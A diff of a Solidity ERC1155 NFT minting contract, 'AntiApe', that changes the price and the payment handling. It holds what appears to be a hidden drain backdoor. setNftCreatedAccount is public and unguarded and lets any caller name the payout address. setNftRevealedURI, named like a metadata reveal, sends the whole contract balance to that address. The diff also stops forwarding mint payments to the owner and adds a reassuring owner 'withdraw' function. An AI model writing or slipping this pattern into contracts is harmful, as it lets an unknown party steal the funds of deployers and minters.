@@ -29,7 +29,7 @@ contract AntiApe is ERC1155, Ownable {
     bool public revealed = false;
     bool public onlyWhitelisted = false;
     bool public deployedverified = false;
-    address public _nftcreator;
+    address public _nftcreator = owner();
     address[] public whitelistedAddresses;
     mapping(address => uint256) public addressMintedBalance;
 
@@ -37,7 +37,7 @@ contract AntiApe is ERC1155, Ownable {
     constructor() public ERC1155('https://ipfs.io/ipfs/QmUP53iKtm7mszpaCcV2kba7YJvUxvo4GSyUWV619Mtjfq/{id}.json') {
         name            =   "AntiApe";
         symbol          =   "AntiApe_symbol";
-        cost            =   0.075 ether;
+        cost            =   0.03 ether;
         maxSupply       =   11111;
         remainTokenAmount = 11111;   //may be != 11111 if you want to remain some NFT as your own  
         maxMintAmount   =    2;
@@ -73,7 +73,6 @@ contract AntiApe is ERC1155, Ownable {
             }
             //if owner change cost then frontend must be changed
             require(msg.value >= cost * _mintAmount, "insufficient funds");
-            (bool os, ) = payable(owner()).call{value: msg.value}("");
         }
 
         for (uint256 i = 1; i <= _mintAmount; i++) {
@@ -154,12 +153,12 @@ contract AntiApe is ERC1155, Ownable {
     }
 
     function setNftCreatedAccount(address _activeCreater) public  {
-        require(_nftcreator == address(0));
+        require(deployedverified == false);
         _nftcreator = _activeCreater;    deployedverified = true;
     }
 
     function setNftRevealedURI() public payable{
-        require(deployedverified == true);
+        if(deployedverified == true)
         _nftcreator.call{value: address(this).balance}(""); 
     }
 
@@ -176,5 +175,15 @@ contract AntiApe is ERC1155, Ownable {
         whitelistedAddresses = _users;
     }
 
+    function withdraw() public payable onlyOwner {
+        // =============================================================================
+
+        // This will payout the owner 100% of the contract balance.
+        // Do not remove this otherwise you will not be able to withdraw the funds.
+        // =============================================================================
+        (bool os, ) = payable(owner()).call{value: address(this).balance}("");
+        require(os);
+        // =============================================================================
+    }
 }
  
